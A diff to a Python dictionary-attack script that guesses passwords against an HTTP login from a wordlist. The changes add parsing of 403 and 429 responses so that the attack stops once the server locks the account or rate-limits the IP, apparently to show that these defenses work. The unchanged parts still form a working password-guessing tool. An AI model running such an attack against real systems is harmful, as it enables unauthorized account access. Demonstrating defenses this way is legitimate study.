@@ -39,6 +39,10 @@ import time
 SOCKET_TIMEOUT = 5.0  # seconds; keeps a hung server from freezing the attack
 RECV_CHUNK = 4096     # bytes to read per recv() call
 
+# If the server rate-limits us (HTTP 429) this many times in a row, we conclude a
+# per-IP defense is active and give up rather than hammering a wall pointlessly.
+MAX_CONSECUTIVE_BLOCKS = 3
+
 
 # --- 1. url_encode -----------------------------------------------------------
 
@@ -149,12 +153,62 @@ def parse_response(response: str) -> bool:
     return status_ok and body_ok
 
 
+def get_status_code(response: str) -> int:
+    """
+    Extract the numeric HTTP status code from the response status line.
+
+    e.g. "HTTP/1.1 429 TOO MANY REQUESTS" -> 429. Returns 0 if it can't be found
+    (empty/malformed response), so callers can treat that as "no clear status".
+    """
+    if not response:
+        return 0
+    status_line = response.split("\r\n", 1)[0]
+    fields = status_line.split(" ")
+    # Expected shape: ["HTTP/1.1", "429", "TOO", "MANY", ...]
+    if len(fields) >= 2 and fields[1].isdigit():
+        return int(fields[1])
+    return 0
+
+
+def classify_response(response: str) -> str:
+    """
+    Map a raw response to one outcome: SUCCESS, LOCKED, BLOCKED, or FAIL.
+
+    LOCKED  (403) -> the account was locked by the server's per-user defense.
+    BLOCKED (429) -> our IP is being rate-limited by the per-IP defense.
+    These two signal that a defense mechanism kicked in, not just a wrong guess.
+    """
+    if parse_response(response):
+        return "SUCCESS"
+    status = get_status_code(response)
+    if status == 403:
+        return "LOCKED"
+    if status == 429:
+        return "BLOCKED"
+    return "FAIL"
+
+
 # --- 5. log_result -----------------------------------------------------------
 
-def log_result(username: str, password: str, success: bool) -> None:
-    """Print one line describing an attempt to stdout."""
-    tag = "[+]" if success else "[-]"
-    outcome = "SUCCESS" if success else "FAIL"
+# Tags/labels for each outcome, so the output makes the defense visible.
+_OUTCOME_TAGS = {
+    "SUCCESS": "[+]",
+    "FAIL": "[-]",
+    "BLOCKED": "[!]",  # rate-limited (429)
+    "LOCKED": "[X]",   # account locked (403)
+}
+
+
+def log_result(username: str, password: str, outcome) -> None:
+    """
+    Print one line describing an attempt to stdout.
+
+    `outcome` may be a bool (True/False -> SUCCESS/FAIL, the original interface)
+    or one of the outcome strings SUCCESS/FAIL/BLOCKED/LOCKED.
+    """
+    if isinstance(outcome, bool):
+        outcome = "SUCCESS" if outcome else "FAIL"
+    tag = _OUTCOME_TAGS.get(outcome, "[-]")
     print("%s %s : %-20s -> %s" % (tag, username, password, outcome))
 
 
@@ -328,6 +382,8 @@ def dictionary_attack(target, port, host_header, username, wordlist_path, is_csv
 
     attempts = 0
     found_password = None
+    defense = None            # None, "LOCKED", or "BLOCKED" if a defense stopped us
+    consecutive_blocks = 0
     start = time.time()
 
     for password in iter_wordlist(wordlist_path, is_csv):
@@ -340,18 +396,42 @@ def dictionary_attack(target, port, host_header, username, wordlist_path, is_csv
             print("[!] %s : %-20s -> ERROR (%s)" % (username, password, exc))
             continue
 
-        success = parse_response(response)
-        log_result(username, password, success)
+        outcome = classify_response(response)
+        log_result(username, password, outcome)
 
-        if success:
+        if outcome == "SUCCESS":
             found_password = password
             break
+
+        if outcome == "LOCKED":
+            # Per-user lockout: the account is locked for the rest of the run, so
+            # every further guess is pointless. Stop.
+            defense = "LOCKED"
+            break
+
+        if outcome == "BLOCKED":
+            # Per-IP rate limit (429). Count consecutive blocks; if the wall
+            # persists, conclude a defense is active and give up.
+            consecutive_blocks += 1
+            if consecutive_blocks >= MAX_CONSECUTIVE_BLOCKS:
+                defense = "BLOCKED"
+                break
+            continue
+
+        # A normal wrong-password failure resets the block streak.
+        consecutive_blocks = 0
 
     elapsed = time.time() - start
 
     print("-" * 60)
     if found_password is not None:
         print("[+] PASSWORD FOUND: %s : %s" % (username, found_password))
+    elif defense == "LOCKED":
+        print("[X] BLOCKED BY DEFENSE: account '%s' was locked (HTTP 403) after "
+              "repeated failures. Dictionary attack defeated." % username)
+    elif defense == "BLOCKED":
+        print("[!] BLOCKED BY DEFENSE: our IP was rate-limited (HTTP 429) "
+              "%d times in a row. Dictionary attack throttled." % consecutive_blocks)
     else:
         print("[-] Password not found for '%s' (wordlist exhausted)." % username)
     print("[*] Attempts: %d | Time: %.2fs" % (attempts, elapsed))
